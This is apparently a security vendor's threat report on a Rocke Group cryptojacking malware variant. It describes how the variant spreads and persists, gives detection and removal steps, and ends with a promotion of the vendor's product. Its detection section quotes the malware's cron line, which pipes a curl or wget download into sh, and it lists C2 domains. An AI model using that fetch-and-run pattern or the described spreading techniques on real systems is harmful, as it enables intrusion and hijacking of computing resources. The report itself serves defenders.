New Malware Variant Exploits Production Environment
Rocke Group is a Chinese-based threat actor most known for running cryptojacking malware
on Linux machines. The group has been active since 2018 and continues to evolve by
modifying its tools and techniques to stay evasive. In 2019, we reported that Rocke Group
was competing with Pacha Group for cryptomining positioning on Linux-based servers in the
cloud.
We have found a new malware variant developed by Rocke Group, that infects other
machines in the network using saved SSH keys and weak passwords. It also exploits
vulnerabilities in popular platforms and services such as Jenkins, Redis and ActiveMQ. Once
the victim is infected a Monero cryptominer is executed.
Below we present our findings with instructions on how to check if your system has been
compromised, as well as how to protect your cloud environments against future Rocke
Group attacks.

Capabilities and Findings
The malware that is initially delivered to the victim’s server is packed with a modified
UPX which can make it harder for some Endpoint Detection and Response (EDR) products
to detect the malicious code. This threat contains a number of modules that are stored in a
compressed form inside the malware, and during the execution the payloads are extracted
and executed.
Rocke Group uses a new script that downloads malware from a hosting server and executes
it. The malware then uses public SSH keys, which are saved in a file called “known_hosts”
on the victim’s Linux machine, to infect other machines on the network.
The malware archives persistence using a scheduled task in crontab and bashrc files. It
creates a service that controls the execution of the malware and configures it to be executed
on startup. The payload of the service is extracted from within the Rocke Group sample.
Next, the malware attempts to spread in the network by brute forcing SSH, Redis and
Jenkins with weak passwords. Then, it exploits vulnerabilities. For Jenkins it uses two
vulnerabilities for executing code (CVE-2018-1000861, CVE-2019-1003000) and for
ActiveMQ it tries to do an arbitrary file writing (CVE-2016-3088).
To hide the activity of the malware, it implements an evasion technique that uses library
hijacking. This way the information retrieved by system commands is altered in a way that
hides resources used by the malware and its components. For instance, running the ‘top’
command will not show the high CPU usage caused by the cryptomining malware.

One of the compressed modules is an XMRig Miner. Before the miner is executed the
dropper kills any other process that uses more than 30% of the cloud server’s CPU, this way
the cryptominer will have all of the CPU for itself.

Detection and Response
Detect if a machine in your system has been compromised by following all of these steps:
1. The malware creates files in the following directories:
/usr/local/sbin
/usr/local/bin
/usr/bin
/usr/libexec
/tmp
Check if there are suspicious files in these locations. This campaign is known for using
similar names to valid Linux services and file names such as “kerberods”, so pay attention to
the files you see in these directories. In other cases, it uses file names like:
6ff4ba5d0de4498. In addition, the malware changes the timestamps of files created during
the attack so that they appear older. You should not rely on the creation/modification time of
the files.
Response: Remove the malicious files
MITRE Technique: Masquerading (T1036)
Check if there is a service that listens on port 61131 for incoming connections. Use the
command: netstat -tupln
Response: Find the PID of the process and kill it. Run the following command to get the
PID: netstat -ltnp | grep -w ‘:61131’ and then: sudo kill -9 <PID> to kill the process.
Check if you have a service called sshservice.service. You can do this by running:
systemctl status sshservice.service
Response: Stop and remove the service by running these commands:
systemctl stop [servicename]
systemctl disable [servicename]
rm /etc/systemd/system/[servicename]
rm /etc/systemd/system/[servicename]
rm /usr/lib/systemd/system/[servicename]
rm /usr/lib/systemd/system/[servicename]
systemctl daemon-reload systemctl reset-failed

Check if the cron jobs include commands in the following format:
*/15 * * * * (curl -fsSL -m180 ||wget -q -T180 -O- )|sh Check the following location of
scheduled jobs:
/var/spool/cron/root
/var/spool/cron/crontabs/root
/etc/cron.d/root
Response: Delete these commands from the crontab
MITRE Technique: Scheduled Task/Job (T1053)
Check that /etc/bashrc contains commands in the same format as the crontab files
Response: Delete the commands from the file
MITRE Technique: Event Triggered Execution using .bashrc file (T1546)
This campaign uses DNS over HTTPs (DoH) to obtain the address of the C2 server using
hard-coded domains that send back an encrypted DNS record. Inspect your network traffic
for anomalies in HTTPs packages. Check if your machine tried to access one (or more) of
the following domains:
Update.iap5u1rbety6vifaxsi9vovnc9jjay2l[.]com
cloudflare-dns[.]com
MITRE Technique: Protocol Tunneling (T1572) and Encrypted Channel (T1573)
The malware tries to infect other machines in the network by brute forcing weak
passwords and exploiting vulnerabilities in Jenkins, Redis, SSH and ActiveMQ. Follow all of
the steps above for machines that have these services.

Be Proactive
Use strong passwords for SSH, Jenkins and Redis services. It is also highly
recommended to use TLS authentication.
Use different passwords and authentication keys for each machine in the network.
Make sure that your Jenkins and ActiveMQ services have the latest updates.
Restrict access to services and machines, and give only the required permissions for
each user.
Filter network traffic to untrusted or known bad domains.
Apply detection of anomalies in the networks to detect suspicious communication that
digresses from the usual traffic.

Runtime Protection is a Must

4/7

This attack is sophisticated in that it implements evasion techniques making detection much
harder. It also spreads to other services and machines on the network making it harder to
respond to. Runtime protection with Intezer Protect gives you immediate visibility over all
code running in your systems and alerts you whenever unauthorized code is executed. So, if
Rocke Group attacks an environment with Intezer Protect installed on it, the user would
immediately get an alert on all infected machines with the ability to terminate the malicious
processes.
While there are dozens of cloud attack vectors that threat actors can utilize, such as software
vulnerabilities and misconfigurations, eventually all attackers must run code or commands in
the production environment to conduct any damage.
Consider that it’s not realistic to be able to close all attack vectors. Not only does it take time
to fix vulnerabilities, but there are always attack vectors that are practically impossible to
prevent such as supply chain or unknown vulnerabilities. Recent attacks have shown that
Linux cryptominers and other threats will find their way into the production environment no
matter how hard you work to reduce the attack surface. Runtime protection is a necessary
last line of defense as actors like Rocke Group remain active.

How Can Intezer Help?
You will be notified as soon as malicious or unauthorized code is executed. In this case,
execution of the script and the malware will trigger an alert. You can see the full process tree,
know exactly which malicious processes were created by the malware, and be able to stop
them. While the Rocke Group campaign uses advanced evasion techniques to hide the
malware and its resources, with Intezer Protect you will see all of the information and activity
that happens on your machine.

5/7

The way we detect threats is different from other solutions. Anomaly detection and
behavioral profiling can fail to detect advanced attacks designed to look “normal.” We detect
threat variants by recognizing even the slightest amount of malicious code reuse. This
innovation has proven to be the fastest to identify attacks in Linux and containerized
environments.
Most runtime solutions are based on behavioral profiling which generates high false positives
and requires constant tweaking of rules and policies. Our core detection strategy is based on
detecting unauthorized code instead of a set of rules. The result is very few false positives,
and contextualized alerts indicating only real attacks.
We inspect any new code running in memory and analyze it against our cyber immune
system of trusted and malicious code. This allows us to inspect every change in memory to
see if it’s truly unrecognized or malicious code, or just a natural change such as a software
upgrade. This analysis does not just give you a “good or bad” answer. It also provides a deep
understanding about the threat, where it came from, and who is responsible, crucial for
responding smarter and faster to incidents.
